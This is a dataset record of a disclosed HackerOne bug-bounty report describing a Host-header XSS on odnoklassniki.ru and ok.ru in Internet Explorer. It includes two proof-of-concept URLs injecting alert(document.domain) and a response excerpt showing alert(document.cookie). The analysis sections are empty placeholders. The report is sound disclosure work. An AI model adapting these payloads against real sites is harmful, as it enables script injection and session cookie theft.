---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '39316'
original_report_id: '39316'
title: '[odnoklassniki.ru] XSS via Host'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-12-13T22:04:51.931Z'
disclosed_at: '2016-09-26T14:12:54.445Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [odnoklassniki.ru] XSS via Host

## Metadata

- HackerOne Report ID: 39316
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2016-09-26T14:12:54.445Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

XSS через Host заголовок в браузере Internet Explorer (с использованием ошибки перенаправления).

PoC:
http://blackfan.ru/x?r=http://odnoklassniki.ru%252f%253f%2523"*alert(document.domain)*"
http://blackfan.ru/x?r=http://ok.ru%252f%253f%2523"*alert(document.domain)*"

HTTP Response:
```<script type="text/javascript">
 ...
 host:"http://odnoklassniki.ru/?#"*alert(document.cookie)*""
 ...
 </script>```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
